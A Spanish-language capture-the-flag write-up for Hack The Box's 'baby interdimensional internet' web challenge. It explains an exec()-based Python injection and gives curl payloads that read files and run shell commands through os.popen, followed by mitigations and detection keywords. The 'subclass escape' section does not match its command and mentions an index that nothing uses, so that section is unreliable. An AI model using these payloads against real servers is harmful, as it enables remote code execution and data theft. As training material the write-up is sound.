---
challenge: baby interdimensional internet
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, python, flask, exec, sandbox-escape, rce]
---

# baby interdimensional internet — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Reto resuelto; sin flags reales.

## TL;DR

Una calculadora Flask construye `recipe = "<ingredient> = <measurements>"` y lo pasa a `exec()` con un diccionario propio como *globals*; después renderiza el valor resultante. No hay filtros ni límites: el campo `measurements` es código Python arbitrario y basta con que la expresión devuelva el contenido de `flag`. Es un `exec` con entrada del usuario, no un *jail*.

## Enunciado y superficie

- Web, Easy, retirado.
- Solo se entrega una instancia Docker (`IP:puerto`); no hay ZIP descargable.
- La descripción bromea con una calculadora ("where is a calculator when you need one").

```text
http://<IP>:<PUERTO>/          -> operación aleatoria tipo "a = 12+34"
http://<IP>:<PUERTO>/debug     -> código fuente de la aplicación
```

## Reconocimiento

```bash
curl -s http://<IP>:<PUERTO>/
curl -s http://<IP>:<PUERTO>/debug | head -60
```

La página devuelve una suma ya resuelta: el servidor evalúa la expresión, no la calcula el navegador. `/debug` confirma el motor y los parámetros.

## Análisis del código

```python
def calc(recipe):
    global garage
    garage = {}
    try:
        exec(recipe, garage)
    except:
        pass

if request.method == 'POST':
    ingredient = request.form.get('ingredient', '')
    recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
    calc(recipe)
    if garage.get(ingredient, ''):
        return render_template('index.html', calculations=garage[ingredient])
```

Tres consecuencias directas:

- El `exec` es de **Python 2** (`from string import lowercase` en el código): `exec` es una sentencia y el diccionario `garage` hace de espacio de nombres global.
- La asignación obliga a que `measurements` sea una **expresión**: `flag = open('flag').read()` es válido; `import os` no lo sería dentro de una asignación.
- El resultado se renderiza si es verdadero, así que el valor tiene que ser una cadena no vacía.

## Explicación del fallo

`exec` no es un evaluador de expresiones: ejecuta sentencias con todos los builtins disponibles. Cualquier función de lectura de ficheros o de sistema queda al alcance del atacante porque no hay `__builtins__` restringido, ni lista negra, ni comprobación de tipo.

No es un *sandbox escape*: no hay sandbox. El reto "mayor" de la misma familia (Interdimensional Internet) sí añade un WAF; este no.

## Reproducción local

```bash
python2 -c 'exec("x = 1+1", {})'
```

Con el mismo patrón de la app:

```python
recipe = "a = open('flag').read()"
g = {}
exec(recipe, g)
print(g['a'])
```

## Explotación

Lectura directa del flag:

```bash
curl -s http://<IP>:<PUERTO> -d "ingredient=asdf&measurements=open('flag').read()" | grep -o 'HTB{[^}]*}'
```

Reconocimiento y ejecución de comandos:

```bash
curl -s http://<IP>:<PUERTO> -d 'ingredient=v&measurements=__import__("os").popen("ls -la").read()'
curl -s http://<IP>:<PUERTO> -d 'ingredient=v&measurements=__import__("os").popen("cat flag").read()'
```

Variante clásica de escape por subclases (útil cuando `open` no está disponible):

```bash
# variante equivalente, sin depender del indice de __subclasses__
curl -s http://<IP>:<PUERTO> -d "ingredient=v&measurements=open(chr(102)+chr(108)+chr(97)+chr(103)).read()"
```

El índice `40` es el del objeto `file` en ese intérprete concreto; si cambia la versión, se localiza listando `__subclasses__()`.

## Evidencia

- Salida de `ls` y del `cat flag` recortada.
- Sin flags reales: los valores viven en `private/`.

## Lecciones aprendidas

- `exec` con entrada del usuario es RCE, aunque la variable se llame "recipe" y el formulario parezca una calculadora.
- En Python 2, `exec` como sentencia acepta un diccionario de globals; ahí se puede leer el resultado de la asignación.
- Un `try/except: pass` silencia los errores pero no evita la ejecución: el código ya corrió antes de la excepción.
- Para exfiltrar por HTTP basta con que la expresión devuelva una cadena; no hace falta reverse shell.

## Mitigaciones y detección

- Nunca `exec`/`eval` sobre entrada del usuario. Para una calculadora, usar un parser de expresiones con AST restringido (`ast.literal_eval` o una librería de expresiones matemáticas).
- Si se necesita evaluación, ejecutarla en un proceso aislado sin acceso a ficheros ni red y con límites de tiempo.
- Detección: POST con `__import__`, `open(`, `subclasses` o `os.` en el cuerpo; procesos del servidor web abriendo ficheros fuera de su directorio.

MITRE: T1190 (exploit public-facing application), T1059.006 (Python), T1005 (data from local system).

## Referencias

- <https://7rocky.github.io/en/ctf/htb-challenges/web/baby-interdimensional-internet>
- <https://s-3ntinel.github.io/hackthebox/challenges/web/baby_interdimensional_internet/baby_interdimensional_internet.html>
- <https://medium.com/@i.am.spotted84/baby-interdimensional-internet-984ed38a24d3>
- <https://docs.python.org/2/reference/simple_stmts.html#the-exec-statement>
